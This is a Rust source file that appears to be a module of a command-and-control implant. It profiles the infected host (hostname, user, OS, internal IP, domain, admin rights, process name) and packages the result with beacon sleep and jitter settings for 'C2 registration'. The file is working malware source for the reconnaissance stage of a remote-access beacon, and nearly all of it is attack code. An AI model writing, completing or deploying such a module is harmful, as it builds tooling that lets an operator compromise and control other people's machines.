/// Host profiling: gather system information for C2 registration.

use super::TaskResult;
use serde_json::json;

pub fn run(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    let profile = gather_profile();
    match serde_json::to_string(&profile) {
        Ok(s) => TaskResult::success(task_id, s),
        Err(e) => TaskResult::error(task_id, format!("profile serialization: {}", e)),
    }
}

pub fn gather_profile() -> serde_json::Value {
    json!({
        "hostname": get_hostname(),
        "username": get_username(),
        "os": get_os(),
        "arch": std::env::consts::ARCH,
        "ip_internal": get_internal_ip(),
        "domain": get_domain(),
        "is_admin": is_admin(),
        "pid": std::process::id(),
        "process_name": get_process_name(),
        "sleep_seconds": 5,
        "jitter_percent": 20,
    })
}

fn get_hostname() -> String {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            use winapi::um::sysinfoapi::GetComputerNameExW;
            // 1 = 1
            let mut size: u32 = 256;
            let mut buf: Vec<u16> = vec![0; size as usize];
            if GetComputerNameExW(1, buf.as_mut_ptr(), &mut size) != 0 {
                return String::from_utf16_lossy(&buf[..size as usize]);
            }
        }
        "unknown".to_string()
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::fs::read_to_string("/etc/hostname")
            .unwrap_or_else(|_| {
                std::process::Command::new("hostname")
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                    .unwrap_or_else(|_| "unknown".to_string())
            })
            .trim()
            .to_string()
    }
}

fn get_username() -> String {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            use winapi::um::winbase::GetUserNameW;
            let mut size: u32 = 256;
            let mut buf: Vec<u16> = vec![0; size as usize];
            if GetUserNameW(buf.as_mut_ptr(), &mut size) != 0 {
                return String::from_utf16_lossy(&buf[..size as usize - 1]);
            }
        }
        "unknown".to_string()
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::env::var("USER")
            .or_else(|_| std::env::var("LOGNAME"))
            .unwrap_or_else(|_| {
                std::process::Command::new("whoami")
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                    .unwrap_or_else(|_| "unknown".to_string())
            })
    }
}

fn get_os() -> String {
    let os = std::env::consts::OS;
    #[cfg(target_os = "windows")]
    {
        // Try to get Windows version from registry
        let version = std::process::Command::new("cmd")
            .args(["/c", "ver"])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .unwrap_or_default();
        if !version.is_empty() {
            return version;
        }
    }
    #[cfg(target_os = "linux")]
    {
        if let Ok(release) = std::fs::read_to_string("/etc/os-release") {
            for line in release.lines() {
                if line.starts_with("PRETTY_NAME=") {
                    return line
                        .trim_start_matches("PRETTY_NAME=")
                        .trim_matches('"')
                        .to_string();
                }
            }
        }
    }
    os.to_string()
}

fn get_internal_ip() -> String {
    #[cfg(target_os = "windows")]
    {
        let output = std::process::Command::new("ipconfig")
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();
        for line in output.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with("IPv4 Address") || trimmed.starts_with("IPv4") {
                if let Some(ip) = trimmed.split(':').last() {
                    let ip = ip.trim();
                    if !ip.starts_with("127.") && !ip.is_empty() {
                        return ip.to_string();
                    }
                }
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Try to connect to external address to find default interface IP
        if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
            if socket.connect("8.8.8.8:80").is_ok() {
                if let Ok(addr) = socket.local_addr() {
                    return addr.ip().to_string();
                }
            }
        }
    }
    "0.0.0.0".to_string()
}

fn get_domain() -> String {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            use winapi::um::sysinfoapi::GetComputerNameExW;
            // 2 = 2
            let mut size: u32 = 256;
            let mut buf: Vec<u16> = vec![0; size as usize];
            if GetComputerNameExW(2, buf.as_mut_ptr(), &mut size) != 0 {
                let domain = String::from_utf16_lossy(&buf[..size as usize]);
                if !domain.is_empty() {
                    return domain;
                }
            }
        }
        "WORKGROUP".to_string()
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::process::Command::new("hostname")
            .arg("-d")
            .output()
            .map(|o| {
                let d = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if d.is_empty() { "none".to_string() } else { d }
            })
            .unwrap_or_else(|_| "none".to_string())
    }
}

fn is_admin() -> bool {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            use winapi::um::securitybaseapi::CheckTokenMembership;
            use winapi::um::winnt::{PSID, SID_IDENTIFIER_AUTHORITY};
            use winapi::shared::minwindef::BOOL;
            use std::ptr;

            // Build the Administrators group SID (S-1-5-32-544)
            let mut nt_authority = SID_IDENTIFIER_AUTHORITY { Value: [0, 0, 0, 0, 0, 5] };
            let mut admin_group: PSID = ptr::null_mut();

            use winapi::um::securitybaseapi::AllocateAndInitializeSid;
            use winapi::um::winnt::SECURITY_BUILTIN_DOMAIN_RID;
            use winapi::um::winnt::DOMAIN_ALIAS_RID_ADMINS;

            if AllocateAndInitializeSid(
                &mut nt_authority,
                2,
                SECURITY_BUILTIN_DOMAIN_RID as u32,
                DOMAIN_ALIAS_RID_ADMINS as u32,
                0, 0, 0, 0, 0, 0,
                &mut admin_group,
            ) != 0
            {
                let mut is_member: BOOL = 0;
                if CheckTokenMembership(ptr::null_mut(), admin_group, &mut is_member) != 0 {
                    use winapi::um::securitybaseapi::FreeSid;
                    FreeSid(admin_group);
                    return is_member != 0;
                }
                use winapi::um::securitybaseapi::FreeSid;
                FreeSid(admin_group);
            }
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    {
        unsafe { libc::geteuid() == 0 }
    }
}

fn get_process_name() -> String {
    std::env::current_exe()
        .map(|p| {
            p.file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string())
        })
        .unwrap_or_else(|_| "unknown".to_string())
}
